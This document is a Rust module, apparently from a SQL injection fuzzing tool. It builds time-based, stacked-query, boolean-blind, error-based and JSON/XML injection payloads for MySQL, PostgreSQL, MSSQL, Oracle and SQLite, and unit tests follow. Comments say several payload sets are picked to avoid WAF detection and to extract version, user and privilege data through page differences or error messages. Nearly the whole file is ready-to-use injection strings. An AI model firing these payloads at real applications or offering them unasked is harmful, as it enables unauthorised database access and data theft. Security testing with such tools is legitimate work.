//! Blind and stacked-query SQL mutation helpers.

use crate::grammar::sql::common::SqlMutation;

const TIME_BLINDS: &[(&str, &str)] = &[
    ("SLEEP(5)", "mysql_sleep"),
    ("BENCHMARK(10000000,SHA1('test'))", "mysql_benchmark"),
    ("IF(1=1,SLEEP(5),0)", "mysql_conditional_sleep"),
    ("pg_sleep(5)", "pg_sleep"),
    ("(SELECT pg_sleep(5))", "pg_sleep_subquery"),
    ("WAITFOR DELAY '0:0:5'", "mssql_waitfor"),
    ("WAITFOR TIME '00:00:05'", "mssql_waitfor_time"),
    ("DBMS_PIPE.RECEIVE_MESSAGE('a',5)", "oracle_dbms_pipe"),
    ("UTL_INADDR.GET_HOST_ADDRESS('target')", "oracle_utl_inaddr"),
    (
        "LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))",
        "sqlite_heavy_like",
    ),
];

const STACKED_SUFFIXES: &[(&str, &str)] = &[
    (";SELECT SLEEP(5)--", "mysql_stacked_sleep"),
    (";WAITFOR DELAY '0:0:5'--", "mssql_stacked_waitfor"),
    (";SELECT pg_sleep(5)--", "pg_stacked_sleep"),
    (";DECLARE @a INT--", "mssql_stacked_declare"),
];

const JSON_XML_PAYLOADS: &[(&str, &str)] = &[
    (
        "' OR JSON_EXTRACT('{\"a\":1}','$.a')=1--",
        "mysql_json_extract",
    ),
    (
        "' OR ('{\"a\":1}'::jsonb->>'a')::int=1--",
        "pg_jsonb_extract",
    ),
    ("' OR JSON_VALUE('{\"a\":1}','$.a')=1--", "mssql_json_value"),
    ("' OR xpath('//a',xml('<a>1</a>'))::text='1'--", "pg_xpath"),
];

/// Generate ORDER BY column probe payloads for blind injection.
pub(crate) fn order_by_probes(max_columns: u32) -> Vec<String> {
    (1..=max_columns)
        .map(|column| format!("' ORDER BY {column}--"))
        .collect()
}

/// Generate time-based blind SQL mutations.
pub(crate) fn time_blind_mutations(payload: &str, max_mutations: usize) -> Vec<SqlMutation> {
    let lower = payload.to_ascii_lowercase();
    let mut results = Vec::new();

    for (blind_payload, rule) in TIME_BLINDS {
        if results.len() >= max_mutations {
            break;
        }

        let mutated = if lower.contains("sleep")
            || lower.contains("benchmark")
            || lower.contains("waitfor")
        {
            payload.to_string()
        } else {
            format!(
                "{}' OR {}--",
                payload.trim_end_matches("--").trim_end_matches('#'),
                blind_payload
            )
        };

        if mutated != payload {
            results.push(SqlMutation {
                payload: mutated,
                description: format!("time-based blind: {blind_payload}"),
                rules_applied: vec!["time_blind", rule],
            });
        }
    }

    results
}

/// Generate stacked-query SQL mutations.
pub(crate) fn stacked_query_mutations(payload: &str, max_mutations: usize) -> Vec<SqlMutation> {
    let mut results = Vec::new();
    let base = payload
        .trim_end_matches("--")
        .trim_end_matches('#')
        .trim_end_matches("/*");

    for (suffix, rule) in STACKED_SUFFIXES {
        if results.len() >= max_mutations {
            break;
        }

        results.push(SqlMutation {
            payload: format!("{base}{suffix}"),
            description: format!("stacked query: {suffix}"),
            rules_applied: vec!["stacked_query", rule],
        });
    }

    results
}

/// Generate JSON and XML operator confusion SQL mutations.
pub(crate) fn json_xml_mutations(max_mutations: usize) -> Vec<SqlMutation> {
    JSON_XML_PAYLOADS
        .iter()
        .take(max_mutations)
        .map(|(payload, rule)| SqlMutation {
            payload: (*payload).to_string(),
            description: format!("JSON/XML operator bypass: {rule}"),
            rules_applied: vec!["json_xml_operator", rule],
        })
        .collect()
}

/// Boolean-based blind injection templates.
///
/// These use response differences (true page vs false page) rather than
/// time delays, making them harder for WAFs to detect since there are no
/// SLEEP/WAITFOR/BENCHMARK keywords to match.
const BOOLEAN_BLINDS: &[(&str, &str)] = &[
    // Substring extraction — extract one character at a time
    ("' AND SUBSTRING(@@version,1,1)='5'--", "mysql_version_probe"),
    ("' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--", "mysql_ascii_extract"),
    ("' AND (SELECT LENGTH(user()))>0--", "mysql_length_probe"),
    // PostgreSQL boolean-blind
    ("' AND SUBSTRING(version(),1,1)='P'--", "pg_version_probe"),
    ("' AND (SELECT current_user)='postgres'--", "pg_user_probe"),
    ("' AND (SELECT COUNT(*) FROM pg_tables)>0--", "pg_table_count"),
    // MSSQL boolean-blind
    ("' AND SUBSTRING(@@version,1,1)='M'--", "mssql_version_probe"),
    ("' AND (SELECT IS_SRVROLEMEMBER('sysadmin'))=1--", "mssql_role_probe"),
    // Oracle boolean-blind
    ("' AND SUBSTR(USER,1,1)='S'--", "oracle_user_probe"),
    ("' AND (SELECT COUNT(*) FROM all_tables)>0--", "oracle_table_count"),
    // SQLite boolean-blind
    ("' AND SQLITE_VERSION() LIKE '3%'--", "sqlite_version_probe"),
    ("' AND (SELECT COUNT(*) FROM sqlite_master)>0--", "sqlite_table_count"),
];

/// Error-based blind injection templates.
///
/// These deliberately cause SQL errors that leak data in error messages.
/// WAFs typically don't block error-generating queries since they look
/// like innocent malformed input.
const ERROR_BLINDS: &[(&str, &str)] = &[
    // MySQL error-based (extractvalue/updatexml)
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--", "mysql_extractvalue"),
    ("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--", "mysql_updatexml"),
    // MSSQL error-based (convert/cast)
    ("' AND 1=CONVERT(int,(SELECT @@version))--", "mssql_convert"),
    ("' AND 1=CAST((SELECT DB_NAME()) AS int)--", "mssql_cast"),
    // PostgreSQL error-based (cast)
    ("' AND 1=CAST((SELECT version()) AS int)--", "pg_cast_error"),
    // Oracle error-based (CTXSYS.DRITHSX.SN)
    ("' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--", "oracle_utl_error"),
];

/// Generate boolean-based blind SQL mutations.
pub(crate) fn boolean_blind_mutations(_payload: &str, max_mutations: usize) -> Vec<SqlMutation> {
    let mut results = Vec::new();

    for (blind_payload, rule) in BOOLEAN_BLINDS {
        if results.len() >= max_mutations {
            break;
        }
        results.push(SqlMutation {
            payload: (*blind_payload).to_string(),
            description: format!("boolean-based blind: {rule}"),
            rules_applied: vec!["boolean_blind", rule],
        });
    }

    results
}

/// Generate error-based blind SQL mutations.
pub(crate) fn error_blind_mutations(_payload: &str, max_mutations: usize) -> Vec<SqlMutation> {
    let mut results = Vec::new();

    for (blind_payload, rule) in ERROR_BLINDS {
        if results.len() >= max_mutations {
            break;
        }
        results.push(SqlMutation {
            payload: (*blind_payload).to_string(),
            description: format!("error-based blind: {rule}"),
            rules_applied: vec!["error_blind", rule],
        });
    }

    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn time_blind_generates_mutations() {
        let mutations = time_blind_mutations("' OR 1=1--", 50);
        assert!(!mutations.is_empty());
        assert!(mutations.len() <= 50);
    }

    #[test]
    fn stacked_generates_mutations() {
        let mutations = stacked_query_mutations("' OR 1=1--", 50);
        assert!(!mutations.is_empty());
    }

    #[test]
    fn json_xml_generates_mutations() {
        let mutations = json_xml_mutations(50);
        assert!(!mutations.is_empty());
    }

    #[test]
    fn boolean_blind_generates_mutations() {
        let mutations = boolean_blind_mutations("' OR 1=1--", 50);
        assert!(mutations.len() >= 10, "should produce at least 10 boolean-blind variants");
        // Verify no time-based keywords
        for m in &mutations {
            let lower = m.payload.to_ascii_lowercase();
            assert!(!lower.contains("sleep"), "boolean-blind should not contain SLEEP");
            assert!(!lower.contains("waitfor"), "boolean-blind should not contain WAITFOR");
            assert!(!lower.contains("benchmark"), "boolean-blind should not contain BENCHMARK");
        }
    }

    #[test]
    fn error_blind_generates_mutations() {
        let mutations = error_blind_mutations("' OR 1=1--", 50);
        assert!(mutations.len() >= 5, "should produce at least 5 error-blind variants");
    }

    #[test]
    fn boolean_blind_covers_all_databases() {
        let mutations = boolean_blind_mutations("test", 50);
        let rules: Vec<&str> = mutations.iter().flat_map(|m| m.rules_applied.iter().copied()).collect();
        assert!(rules.iter().any(|r| r.contains("mysql")), "should cover MySQL");
        assert!(rules.iter().any(|r| r.contains("pg")), "should cover PostgreSQL");
        assert!(rules.iter().any(|r| r.contains("mssql")), "should cover MSSQL");
        assert!(rules.iter().any(|r| r.contains("oracle")), "should cover Oracle");
        assert!(rules.iter().any(|r| r.contains("sqlite")), "should cover SQLite");
    }

    #[test]
    fn order_by_probes_correct_count() {
        let probes = order_by_probes(10);
        assert_eq!(probes.len(), 10);
    }
}
